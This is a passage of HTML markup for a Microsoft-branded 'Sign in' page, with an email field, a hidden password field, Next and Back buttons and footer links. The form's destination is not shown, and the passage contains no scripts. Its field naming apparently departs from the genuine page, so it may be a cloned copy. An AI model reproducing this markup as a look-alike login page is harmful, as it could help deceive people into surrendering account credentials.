<img class=logo role=img pngsrc=https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ea19b2112f4dfd8e90b4505ef7dcb4f9.png svgsrc=https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDgiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAxMDggMjQiPjx0aXRsZT5hc3NldHM8L3RpdGxlPjxwYXRoIGQ9Ik00NC44MzYsNC42VjE4LjRoLTIuNFY3LjU4M0g0Mi40TDM4LjExOSwxOC40SDM2LjUzMUwzMi4xNDIsNy41ODNoLS4wMjlWMTguNEgyOS45VjQuNmgzLjQzNkwzNy4zLDE0LjgzaC4wNThMNDEuNTQ1LDQuNlptMiwxLjA0OWExLjI2OCwxLjI2OCwwLDAsMSwuNDE5LS45NjcsMS40MTMsMS40MTMsMCwwLDEsMS0uMzksMS4zOTIsMS4zOTIsMCwwLDEsMS4wMi40LDEuMywxLjMsMCwwLDEsLjQuOTU4LDEuMjQ4LDEuMjQ4LDAsMCwxLS40MTQuOTUzLDEuNDI4LDEuNDI4LDAsMCwxLTEuMDEuMzg1QTEuNCwxLjQsMCwwLDEsNDcuMjUsNi42YTEuMjYxLDEuMjYxLDAsMCwxLS40MDktLjk0OE00OS40MSwxOC40SDQ3LjA4MVY4LjUwN0g0OS40MVptNy4wNjQtMS42OTRhMy4yMTMsMy4yMTMsMCwwLDAsMS4xNDUtLjI0MSw0LjgxMSw0LjgxMSwwLDAsMCwxLjE1NS0uNjM1VjE4YTQuNjY1LDQuNjY1LDAsMCwxLTEuMjY2LjQ4MSw2Ljg4Niw2Ljg4NiwwLDAsMS0xLjU1NC4xNjQsNC43MDcsNC43MDcsMCwwLDEtNC45MTgtNC45MDgsNS42NDEsNS42NDEsMCwwLDEsMS40LTMuOTMyLDUuMDU1LDUuMDU1LDAsMCwxLDMuOTU1LTEuNTQ1LDUuNDE0LDUuNDE0LDAsMCwxLDEuMzI0LjE2OCw0LjQzMSw0LjQzMSwwLDAsMSwxLjA2My4zOXYyLjIzM2E0Ljc2Myw0Ljc2MywwLDAsMC0xLjEtLjYxMSwzLjE4NCwzLjE4NCwwLDAsMC0xLjE1LS4yMTcsMi45MTksMi45MTksMCwwLDAtMi4yMjMuOSwzLjM3LDMuMzcsMCwwLDAtLjg0NywyLjQxNiwzLjIxNiwzLjIxNiwwLDAsMCwuODEzLDIuMzM4LDIuOTM2LDIuOTM2LDAsMCwwLDIuMjA5LjgzN002NS40LDguMzQzYTIuOTUyLDIuOTUyLDAsMCwxLC41LjAzOSwyLjEsMi4xLDAsMCwxLC4zNzUuMXYyLjM1OGEyLjA0LDIuMDQsMCwwLDAtLjUzNC0uMjU1LDIuNjQ2LDIuNjQ2LDAsMCwwLS44NTItLjEyLDEuODA4LDEuODA4LDAsMCwwLTEuNDQ4LjcyMiwzLjQ2NywzLjQ2NywwLDAsMC0uNTkyLDIuMjIzVjE4LjRINjAuNTI1VjguNTA3aDIuMzI5djEuNTU5aC4wMzhBMi43MjksMi43MjksMCwwLDEsNjMuODU1LDguOCwyLjYxMSwyLjYxMSwwLDAsMSw2NS40LDguMzQzbTEsNS4yNTRBNS4zNTgsNS4zNTgsMCwwLDEsNjcuNzkyLDkuNzFhNS4xLDUuMSwwLDAsMSwzLjg1LTEuNDM0LDQuNzQyLDQuNzQyLDAsMCwxLDMuNjIzLDEuMzgxLDUuMjEyLDUuMjEyLDAsMCwxLDEuMywzLjcyOSw1LjI1Nyw1LjI1NywwLDAsMS0xLjM4NiwzLjgzLDUuMDE5LDUuMDE5LDAsMCwxLTMuNzcyLDEuNDI0LDQuOTM1LDQuOTM1LDAsMCwxLTMuNjUyLTEuMzUyQTQuOTg3LDQuOTg3LDAsMCwxLDY2LjQwNiwxMy42bTIuNDI1LS4wNzdhMy41MzUsMy41MzUsMCwwLDAsLjcsMi4zNjgsMi41MDUsMi41MDUsMCwwLDAsMi4wMTEuODE4LDIuMzQ1LDIuMzQ1LDAsMCwwLDEuOTM0LS44MTgsMy43ODMsMy43ODMsMCwwLDAsLjY2NC0yLjQyNSwzLjY1MSwzLjY1MSwwLDAsMC0uNjg4LTIuNDExLDIuMzg5LDIuMzg5LDAsMCwwLTEuOTI5LS44MTMsMi40NCwyLjQ0LDAsMCwwLTEuOTg4Ljg1MiwzLjcwNywzLjcwNywwLDAsMC0uNzA3LDIuNDNtMTEuMi0yLjQxNmExLDEsMCwwLDAsLjMxOC43ODUsNS40MjYsNS40MjYsMCwwLDAsMS40LjcxNyw0Ljc2Nyw0Ljc2NywwLDAsMSwxLjk1OSwxLjI1NiwyLjYsMi42LDAsMCwxLC41NjMsMS42ODlBMi43MTUsMi43MTUsMCwwLDEsODMuMiwxNy43OTRhNC41NTgsNC41NTgsMCwwLDEtMi45Ljg0Nyw2Ljk3OCw2Ljk3OCwwLDAsMS0xLjM2Mi0uMTQ5LDYuMDQ3LDYuMDQ3LDAsMCwxLTEuMjY1LS4zOHYtMi4yOWE1LjczMyw1LjczMywwLDAsMCwxLjM2Ny43LDQsNCwwLDAsMCwxLjMyOC4yNiwyLjM2NSwyLjM2NSwwLDAsMCwxLjE2NC0uMjIxLjc5Ljc5LDAsMCwwLC4zNzUtLjc0MSwxLjAyOSwxLjAyOSwwLDAsMC0uMzktLjgxMyw1Ljc2OCw1Ljc2OCwwLDAsMC0xLjQ3Ny0uNzY1LDQuNTY0LDQuNTY0LDAsMCwxLTEuODI5LTEuMjEzLDIuNjU1LDIuNjU1LDAsMCwxLS41MzktMS43MTMsMi43MDYsMi43MDYsMCwwLDEsMS4wNjMtMi4yQTQuMjQzLDQuMjQzLDAsMCwxLDgxLjUsOC4yNTZhNi42NjMsNi42NjMsMCwwLDEsMS4xNjQuMTE1LDUuMTYxLDUuMTYxLDAsMCwxLDEuMDc4LjN2Mi4yMTRhNC45NzQsNC45NzQsMCwwLDAtMS4wNzgtLjUyOSwzLjYsMy42LDAsMCwwLTEuMjIyLS4yMjEsMS43ODEsMS43ODEsMCwwLDAtMS4wMzQuMjYuODI0LjgyNCwwLDAsMC0uMzcxLjcxMk04NS4yNzgsMTMuNkE1LjM1OCw1LjM1OCwwLDAsMSw4Ni42NjQsOS43MWE1LjEsNS4xLDAsMCwxLDMuODQ5LTEuNDM0LDQuNzQzLDQuNzQzLDAsMCwxLDMuNjI0LDEuMzgxLDUuMjEyLDUuMjEyLDAsMCwxLDEuMywzLjcyOSw1LjI1OSw1LjI1OSwwLDAsMS0xLjM4NiwzLjgzLDUuMDIsNS4wMiwwLDAsMS0zLjc3MywxLjQyNCw0LjkzNCw0LjkzNCwwLDAsMS0zLjY1Mi0xLjM1MkE0Ljk4Nyw0Ljk4NywwLDAsMSw4NS4yNzgsMTMuNm0yLjQyNS0uMDc3YTMuNTM3LDMuNTM3LDAsMCwwLC43LDIuMzY4LDIuNTA2LDIuNTA2LDAsMCwwLDIuMDExLjgxOCwyLjM0NSwyLjM0NSwwLDAsMCwxLjkzNC0uODE4LDMuNzgzLDMuNzgzLDAsMCwwLC42NjQtMi40MjUsMy42NTEsMy42NTEsMCwwLDAtLjY4OC0yLjQxMSwyLjM5LDIuMzksMCwwLDAtMS45My0uODEzLDIuNDM5LDIuNDM5LDAsMCwwLTEuOTg3Ljg1MiwzLjcwNywzLjcwNywwLDAsMC0uNzA3LDIuNDNtMTUuNDY0LTMuMTA5SDk5LjdWMTguNEg5Ny4zNDFWMTAuNDEySDk1LjY4NlY4LjUwN2gxLjY1NVY3LjEzYTMuNDIzLDMuNDIzLDAsMCwxLDEuMDE1LTIuNTU1LDMuNTYxLDMuNTYxLDAsMCwxLDIuNi0xLDUuODA3LDUuODA3LDAsMCwxLC43NTEuMDQzLDIuOTkzLDIuOTkzLDAsMCwxLC41NzcuMTNWNS43NjRhMi40MjIsMi40MjIsMCwwLDAtLjQtLjE2NCwyLjEwNywyLjEwNywwLDAsMC0uNjY0LS4xLDEuNDA3LDEuNDA3LDAsMCwwLTEuMTI2LjQ1N0EyLjAxNywyLjAxNywwLDAsMCw5OS43LDcuMzEzVjguNTA3aDMuNDY5VjYuMjgzbDIuMzM5LS43MTJWOC41MDdoMi4zNTh2MS45MDZoLTIuMzU4djQuNjI5YTEuOTUxLDEuOTUxLDAsMCwwLC4zMzIsMS4yOSwxLjMyNiwxLjMyNiwwLDAsMCwxLjA0NC4zNzUsMS41NTcsMS41NTcsMCwwLDAsLjQ4Ni0uMSwyLjI5NCwyLjI5NCwwLDAsMCwuNS0uMjMxVjE4LjNhMi43MzcsMi43MzcsMCwwLDEtLjczNi4yMzEsNS4wMjksNS4wMjksMCwwLDEtMS4wMTUuMTA2LDIuODg3LDIuODg3LDAsMCwxLTIuMjA5LS43ODQsMy4zNDEsMy4zNDEsMCwwLDEtLjczNi0yLjM2M1oiIGZpbGw9IiM3MzczNzMiLz48cmVjdCB3aWR0aD0iMTAuOTMxIiBoZWlnaHQ9IjEwLjkzMSIgZmlsbD0iI2YyNTAyMiIvPjxyZWN0IHg9IjEyLjA2OSIgd2lkdGg9IjEwLjkzMSIgaGVpZ2h0PSIxMC45MzEiIGZpbGw9IiM3ZmJhMDAiLz48cmVjdCB5PSIxMi4wNjkiIHdpZHRoPSIxMC45MzEiIGhlaWdodD0iMTAuOTMxIiBmaWxsPSIjMDBhNGVmIi8+PHJlY3QgeD0iMTIuMDY5IiB5PSIxMi4wNjkiIHdpZHRoPSIxMC45MzEiIGhlaWdodD0iMTAuOTMxIiBmaWxsPSIjZmZiOTAwIi8+PC9zdmc+ alt=Microsoft>
</div>
 
 
 
 <div role=main data-bind="component: { name: 'pagination-control',
            publicMethods: paginationControlMethods,
            params: {
                enableCssAnimation: svr.fEnableCssAnimation,
                disableAnimationIfAnimationEndUnsupported: svr.fDisableAnimationIfAnimationEndUnsupported,
                initialViewId: initialViewId,
                currentViewId: currentViewId,
                initialSharedData: initialSharedData,
                initialError: $loginPage.getServerError() },
            event: {
                cancel: paginationControl_onCancel,
                load: paginationControlHelper.onLoad,
                unload: paginationControlHelper.onUnload,
                loadView: view_onLoadView,
                showView: view_onShow,
                setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                animationStateChange: paginationControl_onAnimationStateChange } }">
<div data-bind="css: { 'zero-opacity': hidePaginatedView() }">
 
 <div class="pagination-view animate slide-in-next" data-bind="css: {
        'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.sPOST_Username),
        'zero-opacity': hidePaginatedView.hideSubView(),
        'animate': animate(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }">
 
 
 <div data-viewid=1 data-showfedcredbutton=true data-bind="pageViewComponent: { name: 'login-paginated-username-view',
                params: {
                    serverData: svr,
                    serverError: initialError,
                    isInitialView: isInitialState,
                    displayName: sharedData.displayName,
                    otherIdpRedirectUrl: sharedData.otherIdpRedirectUrl,
                    prefillNames: $loginPage.prefillNames,
                    flowToken: sharedData.flowToken,
                    availableSignupCreds: sharedData.availableSignupCreds,
                    customStrings: $loginPage.customStrings(),
                    isCustomizationFailure: $loginPage.isCustomStringsLoadFailure(), 
                    userIdLabel: $loginPage.userIdLabel,
                    cantAccessYourAccountText: $loginPage.cantAccessYourAccountText,
                    hideAccountResetCredentials: $loginPage.hideAccountResetCredentials,
                    accessRecoveryLink: $loginPage.accessRecoveryLink,
                    boilerPlateText: $loginPage.boilerPlateText },
                event: {
                    restoreIsRecoveryAttemptPost: $loginPage.view_onRestoreIsRecoveryAttemptPost,
                    redirect: $loginPage.view_onRedirect,
                    setPendingRequest: $loginPage.view_onSetPendingRequest,
                    registerDialog: $loginPage.view_onRegisterDialog,
                    unregisterDialog: $loginPage.view_onUnregisterDialog,
                    showDialog: $loginPage.view_onShowDialog,
                    updateAvailableCredsWithoutUsername: $loginPage.view_onUpdateAvailableCreds,
                    agreementClick: $loginPage.footer_agreementClick } }">
<div data-bind="component: { name: 'header-control',
    params: {
        serverData: svr,
        title: customTitle() || str['WF_STR_HeaderDefault_Title'],
        headerDescription: customDescription() } }"><div>
 <div class="row title ext-title" id=loginHeader data-bind="externalCss: { 'title': true }">
 <div role=heading aria-level=1 data-bind="text: title">Sign in</div>
 
 </div>
 
</div></div>
<div class=row>
 <div role=alert aria-live=assertive>
 
 </div>
 <div class="form-group col-md-24">
 
 
 <div class=placeholderContainer data-bind="component: { name: 'placeholder-textbox-field',
            publicMethods: usernameTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: svr.fEnableLivePreview ? userIdLabel : tenantBranding.unsafe_userIdLabel || str['STR_SSSU_Username_Hint'] || str['CT_PWD_STR_Email_Example'],
                hintCss: 'placeholder' + (!svr.fAllowPhoneSignIn ? ' ltr_override' : '') },
            event: {
                updateFocus: usernameTextbox.textbox_onUpdateFocus } }">
 
 <input type=email name=email id=email maxlength=113 required class="form-control ltr_override input ext-input text-box ext-text-box" aria-required=true data-report-event=Signin_Email_Phone_Skype data-report-trigger=click data-report-value=Email_Phone_Skype_Entry data-bind="
                    attr: { lang: svr.fApplyAsciiRegexOnInput ? null : 'en' },
                    externalCss: {
                        'input': true,
                        'text-box': true,
                        'has-error': usernameTextbox.error },
                    ariaLabel: tenantBranding.unsafe_userIdLabel || str['CT_PWD_STR_Username_AriaLabel'],
                    ariaDescribedBy: 'loginHeader' + (pageDescription &amp;&amp; !svr.fHideLoginDesc ? ' loginDescription usernameError' : ' usernameError'),
                    textInput: usernameTextbox.value,
                    hasFocusEx: usernameTextbox.focused,
                    placeholder: $placeholderText,
                    autocomplete: svr.fIsUpdatedAutocompleteEnabled ? 'username' : null," aria-label="Enter your email, phone, or Skype." aria-describedby="loginHeader usernameError" placeholder="Email, phone, or Skype" data-report-attached=1 value>
 
 <input name=passwd type=password id=i0118 data-bind="moveOffScreen, textInput: passwordBrowserPrefill" class=moveOffScreen tabindex=-1 aria-hidden=true value>
 
 
 
</div>
 
 </div>
</div>
<div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText &amp;&amp; !boilerPlateText }, externalCss: { 'password-reset-links-container': true }" class="position-buttons password-reset-links-container ext-password-reset-links-container">
 <div class=row>
 <div class=col-md-24>
 <div class=text-13>
 
 
 
 <div class=form-group data-bind="
                    htmlWithBindings: html['WF_STR_SignUpLink_Text'],
                    childBindings: {
                        'signup': {
                            href: svr.urlSignUp || '#',
                            ariaLabel: svr.urlSignUp ? str['WF_STR_SignupLink_AriaLabel_Text'] : str['WF_STR_SignupLink_AriaLabel_Generic_Text'],
                            click: signup_onClick } }">No account? <a href="#" id=signup aria-label="Create a Microsoft account">Create one!</a></div>
 
 
 
 <div class=form-group>
 <a id=cantAccessAccount name=cannotAccessAccount data-bind="
                        text: svr.fEnableLivePreview ? cantAccessYourAccountText : unsafe_cantAccessYourAccountText,
                        click: accessRecoveryLink ? null : cantAccessAccount_onClick,
                        attr: { target: accessRecoveryLink &amp;&amp; '_blank' },
                        href: accessRecoveryLink || '#'" href=#>Can’t access your account?</a>
 </div>
 
 
 
 
 
 
 
 </div>
 </div>
 </div>
</div>
<div class=win-button-pin-bottom data-bind="css : { 'boilerplate-button-bottom': tenantBranding.BoilerPlateText || boilerPlateText }">
 <div class=row data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText || boilerPlateText }">
 <div data-bind="component: { name: 'footer-buttons-field',
            params: {
                serverData: svr,
                isPrimaryButtonEnabled: !isRequestPending(),
                isPrimaryButtonVisible: svr.fShowButtons,
                isSecondaryButtonEnabled: true,
                isSecondaryButtonVisible: svr.fShowButtons &amp;&amp; isSecondaryButtonVisible(),
                secondaryButtonText: secondaryButtonText() },
            event: {
                primaryButtonClick: primaryButton_onClick,
                secondaryButtonClick: secondaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right button-container button-field-container ext-button-field-container" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { 'no-margin-bottom': removeBottomMargin },
    externalCss: { 'button-field-container': true }">
 
 <div data-bind="css: { 'inline-block': true }, externalCss: { 'button-item': true }" class="inline-block button-item ext-button-item">
 <input type=button id=idBtn_Back class="win-button button-secondary button ext-button secondary ext-secondary" data-bind="
            attr: { 'id': secondaryButtonId || 'idBtn_Back' },
            externalCss: {
                'button': true,
                'secondary': true },
            value: secondaryButtonText() || str['CT_HRD_STR_Splitter_Back'],
            ariaDescribedBy: secondaryButtonDescribedBy,
            hasFocus: focusOnSecondaryButton,
            click: secondaryButton_onClick,
            clickBubble: !svr.fEnableLivePreview,
            enable: isSecondaryButtonEnabled" value=Back>
 </div>
 
 <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }, externalCss: { 'button-item': true }" class="inline-block button-item ext-button-item">
 
 <input type=submit id=idSIButton9 name="submit" class="win-button button_primary button ext-button primary ext-primary" data-report-event=Signin_Submit data-report-trigger=click data-report-value=Submit data-bind="
                attr: primaryButtonAttributes,
                externalCss: {
                    'button': true,
                    'primary': true },
                value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
                hasFocus: focusOnPrimaryButton,
                click: svr.fEnableLivePreview ?  function() { } : primaryButton_onClick,
                clickBubble: !svr.fEnableLivePreview,
                enable: isPrimaryButtonEnabled,
                visible: isPrimaryButtonVisible,
                preventTabbing: primaryButtonPreventTabbing" value=Next data-report-attached=1>
 </div>
</div></div>
 </div>
</div>
</div>
 
 
 
 

 
 
 
 </div>
</div></div>
 
 
 
 
 
 
 <div data-bind="component: { name: 'instrumentation-control',
            publicMethods: instrumentationMethods,
            params: { serverData: svr } }">
</div>
 
 </div>
 
 
 
 
 <div data-bind="component: { name: 'fed-cred-buttons-control',
            params: {
                serverData: svr,
                fedCredOptions: $page.otherSigninOptions },
            event: {
                fedCredButtonClick: $page.otherSigninOptionsButton_onClick } }">
<div data-bind="css: { 'app': $page.backgroundLogoUrl }, externalCss: { 'promoted-fed-cred-box': true }" class="promoted-fed-cred-box ext-promoted-fed-cred-box">
 <div class=promoted-fed-cred-content data-bind="css: {
        'animate': $page.useCssAnimations &amp;&amp; $page.animate(),
        'slide-out-next': $page.animate.isSlideOutNext,
        'slide-in-next': $page.animate.isSlideInNext,
        'slide-out-back': $page.animate.isSlideOutBack,
        'slide-in-back': $page.animate.isSlideInBack,
        'app': $page.backgroundLogoUrl }">
 
 <div class="row tile">
 <div class=table role=button tabindex=0 data-bind="
                css: { 'list-item': svr.fSupportWindowsStyles },
                pressEnter: $fedCredButtonsControl.fedCredButton_onClick,
                click: $fedCredButtonsControl.fedCredButton_onClick,
                ariaLabel: $data.text" aria-label="Sign-in options">
 <div class=table-row>
 <div class="table-cell tile-img medium">
 
<img class="tile-img medium" role=presentation data-bind="imgSrc, attr: { src: $data.darkIconUrl }" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDQ4IDQ4Ij48ZGVmcz48c3R5bGU+LmF7ZmlsbDpub25lO30uYntmaWxsOiM0MDQwNDA7fTwvc3R5bGU+PC9kZWZzPjxyZWN0IGNsYXNzPSJhIiB3aWR0aD0iNDgiIGhlaWdodD0iNDgiLz48cGF0aCBjbGFzcz0iYiIgZD0iTTQwLDMyLjU3OFY0MEgzMlYzNkgyOFYzMkgyNFYyOC43NjZBMTAuNjg5LDEwLjY4OSwwLDAsMSwxOSwzMGExMC45LDEwLjksMCwwLDEtNS41NDctMS41LDExLjEwNiwxMS4xMDYsMCwwLDEtMi4yMTktMS43MTlBMTEuMzczLDExLjM3MywwLDAsMSw5LjUsMjQuNTQ3YTEwLjQsMTAuNCwwLDAsMS0xLjEwOS0yLjYyNUExMS42MTYsMTEuNjE2LDAsMCwxLDgsMTlhMTAuOSwxMC45LDAsMCwxLDEuNS01LjU0NywxMS4xMDYsMTEuMTA2LDAsMCwxLDEuNzE5LTIuMjE5QTExLjM3MywxMS4zNzMsMCwwLDEsMTMuNDUzLDkuNWExMC40LDEwLjQsMCwwLDEsMi42MjUtMS4xMDlBMTEuNjE2LDExLjYxNiwwLDAsMSwxOSw4YTEwLjksMTAuOSwwLDAsMSw1LjU0NywxLjUsMTEuMTA2LDExLjEwNiwwLDAsMSwyLjIxOSwxLjcxOUExMS4zNzMsMTEuMzczLDAsMCwxLDI4LjUsMTMuNDUzYTEwLjQsMTAuNCwwLDAsMSwxLjEwOSwyLjYyNUExMS42MTYsMTEuNjE2LDAsMCwxLDMwLDE5YTEwLjAxNSwxMC4wMTUsMCwwLDEtLjEyNSwxLjU3OCwxMC44NzksMTAuODc5LDAsMCwxLS4zNTksMS41MzFabS0yLC44NDRMMjcuMjE5LDIyLjY0MWExNC43MTYsMTQuNzE2LDAsMCwwLC41NjItMS43ODJBNy43NTEsNy43NTEsMCwwLDAsMjgsMTlhOC43ODYsOC43ODYsMCwwLDAtLjctMy41LDguOSw4LjksMCwwLDAtMS45MzgtMi44NTlBOS4yNjksOS4yNjksMCwwLDAsMjIuNSwxMC43MTksOC45LDguOSwwLDAsMCwxOSwxMGE4Ljc4Niw4Ljc4NiwwLDAsMC0zLjUuNyw4LjksOC45LDAsMCwwLTIuODU5LDEuOTM4QTkuMjY5LDkuMjY5LDAsMCwwLDEwLjcxOSwxNS41LDguOSw4LjksMCwwLDAsMTAsMTlhOC43ODYsOC43ODYsMCwwLDAsLjcsMy41LDguOSw4LjksMCwwLDAsMS45MzgsMi44NTlBOS4yNjksOS4yNjksMCwwLDAsMTUuNSwyNy4yODFhOC44NDIsOC44NDIsMCwwLDAsNi40NjkuMkE4Ljc2Nyw4Ljc2NywwLDAsMCwyNC42MDksMjZIMjZ2NGg0djRoNHY0aDRaTTE2LDE0YTEuOTM4LDEuOTM4LDAsMCwxLC43ODEuMTU2LDIsMiwwLDAsMSwuNjI1LjQyMiwyLjE5MSwyLjE5MSwwLDAsMSwuNDM4LjY0MUExLjcwNSwxLjcwNSwwLDAsMSwxOCwxNmExLjkzOCwxLjkzOCwwLDAsMS0uMTU2Ljc4MSwyLDIsMCwwLDEtLjQyMi42MjUsMi4xOTEsMi4xOTEsMCwwLDEtLjY0MS40MzhBMS43MDUsMS43MDUsMCwwLDEsMTYsMThhMS45MzgsMS45MzgsMCwwLDEtLjc4MS0uMTU2LDIsMiwwLDAsMS0uNjI1LS40MjIsMi4xOTEsMi4xOTEsMCwwLDEtLjQzOC0uNjQxQTEuNzA1LDEuNzA1LDAsMCwxLDE0LDE2YTEuOTM4LDEuOTM4LDAsMCwxLC4xNTYtLjc4MSwyLDIsMCwwLDEsLjQyMi0uNjI1LDIuMTkxLDIuMTkxLDAsMCwxLC42NDEtLjQzOEExLjcwNSwxLjcwNSwwLDAsMSwxNiwxNFoiLz48L3N2Zz4=">
 </div>
 <div class="table-cell text-left content" data-bind="css: { 'content': !svr.fSupportWindowsStyles }">
 <div data-bind="
                            text: $data.text,
                            attr: { 'data-test-id': $data.testId }" data-test-id=signinOptions>Sign-in options</div>
 </div>
 </div>
 </div>
 </div>
 
 </div>
</div>
</div>
 
 
 
 
 
 
 </div>
</div>
</div>
 </div>
 </div>
 
 <div id=footer role=contentinfo data-bind="
        externalCss: {
            'footer': true,
            'has-background': !$page.useDefaultBackground() &amp;&amp; $page.showFooter(),
            'background-always-visible': $page.backgroundLogoUrl }" class="footer ext-footer">
 <div data-bind="component: { name: 'footer-control',
            publicMethods: $page.footerMethods,
            params: {
                serverData: svr,
                useDefaultBackground: $page.useDefaultBackground(),
                hasDarkBackground: $page.backgroundLogoUrl(),
                showLinks: true,
                showFooter: $page.showFooter(),
                hideTOU: $page.hideTOU(),
                termsText: $page.termsText(),
                termsLink: $page.termsLink(),
                hidePrivacy: $page.hidePrivacy(),
                privacyText: $page.privacyText(),
                privacyLink: $page.privacyLink() },
            event: {
                agreementClick: $page.footer_agreementClick,
                showDebugDetails: $page.toggleDebugDetails_onClick } }">
<div id=footerLinks class="footerNode text-secondary footer-links ext-footer-links" data-bind="externalCss: { 'footer-links': true }">
 
 
 <a id=ftrTerms data-bind="
            text: termsText,
            href: termsLink,
            click: termsLink_onClick,
            externalCss: {
                'footer-content': true,
                'footer-item': true,
                'has-background': !useDefaultBackground,
                'background-always-visible': hasDarkBackground }" href=https://www.microsoft.com/en-US/servicesagreement/ class="footer-content ext-footer-content footer-item ext-footer-item">Terms of use</a>
 
 
 <a id=ftrPrivacy data-bind="
            text: privacyText,
            href: privacyLink,
            click: privacyLink_onClick,
            externalCss: {
                'footer-content': true,
                'footer-item': true,
                'has-background': !useDefaultBackground,
                'background-always-visible': hasDarkBackground }" href=https://privacy.microsoft.com/en-US/privacystatement class="footer-content ext-footer-content footer-item ext-footer-item">Privacy &amp; cookies</a>
 
 
 
 
 
 
 <a id=moreOptions href=# role=button data-bind="
        click: moreInfo_onClick,
        ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
        attr: { 'aria-expanded': showDebugDetails().toString() },
        hasFocusEx: focusMoreInfo(),
        externalCss: {
            'footer-content': true,
            'footer-item': true,
            'debug-item': true,
            'has-background': !useDefaultBackground,
            'background-always-visible': hasDarkBackground }" aria-label="Click here for troubleshooting information" aria-expanded=false class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a>
</div>
</div>
 </div>
 
</div>
</div>
 
 
 
</div>
 
</form>
<form data-bind="postRedirectForm: postRedirect" method=POST aria-hidden=true target=_top></form>
</div>